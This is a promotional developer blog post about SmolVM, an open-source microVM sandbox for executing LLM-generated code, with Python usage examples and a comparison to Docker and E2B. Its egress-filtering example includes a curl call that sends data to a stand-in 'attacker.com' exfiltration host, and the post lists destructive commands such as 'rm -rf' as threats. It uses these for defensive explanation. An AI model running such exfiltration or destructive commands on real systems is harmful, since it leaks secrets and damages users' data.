---
title: "How to Safely Run AI-Generated Code with SmolVM (Open-Source MicroVM Sandbox)"
published: true
description: "SmolVM is an open-source microVM runtime that lets AI agents run untrusted code in a hardware-isolated sandbox. Learn why Docker isn't enough for LLM-generated code and how to spin up a Firecracker-powered sandbox in three lines of Python."
tags: ai, python, opensource
---

Your AI agent just wrote some Python. Do you feel good about running it on your laptop?

If the answer is "not really" — you're not alone. Every team building agents eventually hits the same wall: **LLM-generated code is the new untrusted input**, and most of the tooling we reach for (Docker, subprocess, `exec`) wasn't built for it.

We built [SmolVM](https://github.com/CelestoAI/SmolVM) to fix this. It's an open-source, Firecracker-backed microVM sandbox that gives AI agents their own disposable computer — boots in under a second, isolated at the hardware level, and disappears when the agent is done.

In this post I'll walk through:

- Why running AI-generated code in Docker is a bad idea
- What microVMs give you that containers don't
- A SmolVM quickstart (three lines of Python)
- Real use cases: coding agents, browser agents, and giving an agent access to your repo
- How SmolVM compares to Docker, E2B, and firecracker-containerd
- FAQ

Let's get into it.

---

## The problem: LLM-generated code is untrusted input

Any team shipping coding agents, app builders, design-to-code tools, or workflow automation eventually needs to execute code the model wrote. That code might:

- `rm -rf` something you care about
- Exfiltrate secrets from your environment
- Make outbound calls to an attacker-controlled server
- Install a dependency that does any of the above
- Pin a CPU at 100% and melt your host

Even if the model is well-aligned, prompt injection from tool outputs, web pages, or pasted documents can redirect it. The right mental model: **treat every code suggestion as if it came from a random person on the internet**, because effectively it did.

That means you need a sandbox. And this is where most teams reach for Docker — which is where the trouble starts.

---

## Why Docker isn't enough for AI agent sandboxes

Containers are great for packaging and deployment. They're not a security boundary you want to bet on for untrusted code execution.

Here's the core issue: **containers share the host kernel**. A process inside a container is just a normal Linux process with some namespaces and cgroups wrapped around it. If the kernel has a privilege-escalation bug (and new ones ship every year), a container escape becomes a host compromise. `runc` CVEs are a regular occurrence. The attack surface is enormous.

MicroVMs take a different approach: a real hypervisor, a real guest kernel, and a hardware virtualization boundary (Intel VT-x, AMD-V, ARM virtualization extensions) between the agent's code and your host. The attack surface shrinks dramatically.

The tradeoff used to be speed — full VMs took 30+ seconds to boot, which is unusable for ephemeral agent sandboxes. [Firecracker](https://firecracker-microvm.github.io/) (the microVM that powers AWS Lambda and Fargate) solved that problem. MicroVMs now boot in **under 500ms**, which makes them practical for per-request isolation.

SmolVM wraps Firecracker (on Linux) and QEMU (on macOS) in a clean Python API so you don't have to deal with TAP devices, rootfs images, or vsock by hand.

---

## SmolVM quickstart

Install SmolVM with a single command:

```bash
curl -sSL https://celesto.ai/install.sh | bash
```

This installs everything you need (including Python), configures your machine, and verifies the setup.

<details>
<summary>Manual installation</summary>

```bash
pip install smolvm
smolvm setup
smolvm doctor
```

On supported Linux and macOS systems, `pip install smolvm` also pulls in the matching `smolvm-core` wheel automatically. Most users do not need Rust installed.

Linux may prompt for `sudo` during setup so it can install host dependencies and configure runtime permissions.

</details>

Spin up a sandbox and run a command:

```python
from smolvm import SmolVM

with SmolVM() as vm:
    result = vm.run("echo 'Hello from the sandbox!'")
    print(result.output)
```

That's it. You now have a hardware-isolated VM with its own kernel, its own filesystem, and its own network namespace — and it'll clean itself up when the `with` block exits.

---

## Real use case #1: Execute LLM-generated code safely

This is the pattern most coding agents need. The model produces a shell command or a Python snippet, and you need to run it without putting your machine at risk.

```python
from smolvm import SmolVM

def execute_code_in_sandbox(code: str) -> str:
    """Tool the agent can call to run shell code safely."""
    with SmolVM() as vm:
        result = vm.run(code)
        return result.stdout if result.exit_code == 0 else result.stderr
```

Wire this up as a tool in your agent framework (LangChain, [Agentor](https://github.com/CelestoAI/agentor), whatever you use), and the agent now has a `bash` tool that is safe to expose. Even if it runs `rm -rf /`, the blast radius is a VM that's about to be thrown away anyway.

---

## Real use case #2: Multi-turn sessions with persistent state

For agents that install dependencies, build projects, or iterate over multiple turns, you want the VM to stick around. SmolVM supports this with explicit lifecycle control and the ability to reconnect by ID:

```python
from smolvm import SmolVM

vm = SmolVM()
vm.start()

# Set up the environment
vm.run("pip install requests pandas")

# Later in the conversation
vm.run("python analysis.py")

# Reconnect from a different process
vm_id = vm.id
# ... hours later ...
vm = SmolVM.from_id(vm_id)
print(vm.status)
```

You can also inject environment variables (persisted to `/etc/profile.d/` inside the VM) for API keys and configuration:

```python
with SmolVM() as vm:
    vm.set_env_vars({"API_KEY": "sk-...", "DEBUG": "1"})
    print(vm.run("echo $API_KEY").output)
```

---

## Real use case #3: Give the agent a browser

Browser-using agents need a full browser session they can see and control. Running Chrome on the host is messy — it touches your cookies, your extensions, your logged-in sessions. Running it in a sandboxed VM is clean:

```python
with SmolVM() as vm:
    # Start a full browser inside the VM
    vm.run("google-chrome --remote-debugging-port=9222 &")

    # Expose the DevTools port to the host
    host_port = vm.expose_local(guest_port=9222, host_port=19222)
    # Now connect Playwright/Puppeteer to http://localhost:19222
```

The agent gets a real browser. Your host stays untouched.

---

## Real use case #4: Let the agent read your repo (read-only)

For coding agents that need to understand an existing codebase, you can mount a host directory **read-only** so the agent can explore without being able to modify anything:

```python
with SmolVM(host_mounts=[("/Users/me/my-repo", "/workspace", "ro")]) as vm:
    # Agent can read but not write
    print(vm.run("ls /workspace").output)
    print(vm.run("cat /workspace/README.md").output)
```

This is how you get the benefits of Cursor-style codebase awareness without trusting the agent (or a prompt-injected dependency) with write access to your project.

---

## Real use case #5: Egress filtering

A common exfiltration vector for malicious LLM output is "send data to attacker.com". SmolVM ships with domain allowlisting so the VM can only reach the hosts you explicitly permit:

```python
with SmolVM(allow_hosts=["api.openai.com", "pypi.org"]) as vm:
    # These work
    vm.run("pip install requests")
    # This silently fails — attacker.com isn't on the list
    vm.run("curl https://attacker.com/exfil")
```

If the model writes code that tries to phone home, the network stack says no.

---

## SmolVM vs Docker vs other sandboxes

Here's how SmolVM stacks up against the options most teams consider:

| Feature | Docker / containers | SmolVM | E2B (hosted) | firecracker-containerd |
|---|---|---|---|---|
| Isolation boundary | Shared kernel | Hardware (KVM/Firecracker) | Hardware (Firecracker) | Hardware (Firecracker) |
| Boot time | ~100ms | ~500ms | ~150ms (hosted) | ~500ms |
| Runs on your infra | ✅ | ✅ | ❌ (their cloud) | ✅ (complex setup) |
| Python SDK | via Docker SDK | ✅ native | ✅ native | ❌ |
| macOS support | ✅ | ✅ (QEMU) | ✅ | ❌ |
| Host directory mounts | ✅ | ✅ | Limited | ✅ |
| Domain allowlisting | Manual | ✅ built-in | ✅ | Manual |
| Snapshots | ❌ | ✅ | ✅ | ✅ |
| Open source | ✅ | ✅ (Apache 2.0) | ❌ | ✅ |
| Price | Free | Free | Per-sandbox | Free |

If you want a hosted sandbox and don't mind a per-request cost, E2B is a great product. If you want to run sandboxes **on your own infrastructure** (for cost, privacy, VPC requirements, or regulated-industry compliance), SmolVM is the option that gets you there without wiring up firecracker-containerd by hand.

---

## Performance

The whole reason microVMs are viable for agent workloads is boot speed. On an AMD Ryzen 7 7800X3D (8C/16T) running Ubuntu with the Firecracker backend, we measure p50 VM lifecycle timings in the sub-second range — fast enough to create a fresh sandbox per agent turn if you want to.

In practice, most teams reuse VMs across a single conversation and recycle them between sessions. With snapshots, you can pre-warm a VM with a specific set of dependencies and restore from that snapshot in milliseconds — effectively free sandbox creation.

---

## Who this is for

SmolVM is useful if you're building:

- **Coding agents** (Cursor/Devin/Claude Code-style products) that need to execute code
- **App builders and design-to-code tools** that compile and run generated projects
- **Workflow automation platforms** (n8n, Zapier-style) where users write code nodes
- **Research and data-analysis agents** that run untrusted Python
- **Browser-using agents** that need a clean, disposable browser session
- **Any LLM product** where the model's output might be executed on a machine you care about

If the model's output ever touches a shell, a Python interpreter, or a browser, you want a sandbox between it and your host.

---

## FAQ

### Why not just use Docker for AI agent sandboxes?

Docker containers share the host kernel. A kernel exploit or container-escape CVE becomes a full host compromise. For AI-generated code — which is effectively untrusted input — you want a hypervisor boundary between the code and your host. MicroVMs give you that, and modern microVMs boot fast enough to use per-request.

### How is SmolVM different from E2B?

E2B is a hosted sandbox service — you pay per sandbox and it runs on their infrastructure. SmolVM is open source and runs on your own machine or your own cloud, which matters if you care about data privacy, egress cost, VPC deployment, or regulated-industry compliance (fintech, health tech, legal tech). Both use Firecracker under the hood on Linux.

### Does SmolVM work on macOS?

Yes. On Linux, SmolVM uses Firecracker with KVM. On macOS, it uses QEMU with the Hypervisor framework. The Python API is identical across both backends, so your code is portable.

### What about Windows?

Windows isn't supported yet. WSL2 works, but native Windows support is on the roadmap.

### Is SmolVM production-ready?

SmolVM is in active development (currently v0.0.3). It's being used in production by early design partners. For mission-critical workloads, we recommend pinning to a specific version and running a staging deploy first. See the [installation docs](https://docs.celesto.ai) for golden-AMI patterns and Firecracker version pinning.

### Can I run GPU workloads inside SmolVM?

Not in the current release. GPU passthrough for Firecracker is experimental upstream, and SmolVM doesn't expose it yet. For CPU-bound code (which is most agent code — data manipulation, API calls, shell commands, browser automation), SmolVM is a great fit. For GPU inference, keep that on the host.

### What's the overhead per sandbox?

A default SmolVM uses ~128MB of RAM and a few hundred MB of disk. You can run dozens of microVMs on a single host without breaking a sweat, which is the whole point of "micro" in microVM.

### How does this fit with frameworks like LangChain or Agentor?

SmolVM is a runtime, not a framework. Wrap `SmolVM().run(...)` as a tool in whatever agent framework you're using. We designed it to be framework-agnostic so it plugs into existing agent stacks.

---

## Getting started

The fastest path:

1. **Install:** `pip install smolvm`
2. **Run host setup:** `./scripts/system-setup.sh` (Linux) or `./scripts/system-setup-macos.sh` (macOS)
3. **Try the quickstart** above
4. **Star the repo** on [GitHub](https://github.com/CelestoAI/SmolVM) so you can find it later (and so we know it's useful — it helps us prioritize)
5. **Read the docs** at [docs.celesto.ai](https://docs.celesto.ai)

SmolVM is Apache 2.0 licensed and free to use in commercial projects. It's built and maintained by [Celesto AI](https://celesto.ai), where we're working on production infrastructure for AI agents.

If you're building something interesting on top of it — or you hit something that doesn't work — open an issue or reach out. We read everything.

---

*Building with AI agents? We'd love to hear what you're working on. Drop a comment below or find us on [GitHub](https://github.com/CelestoAI/SmolVM).*
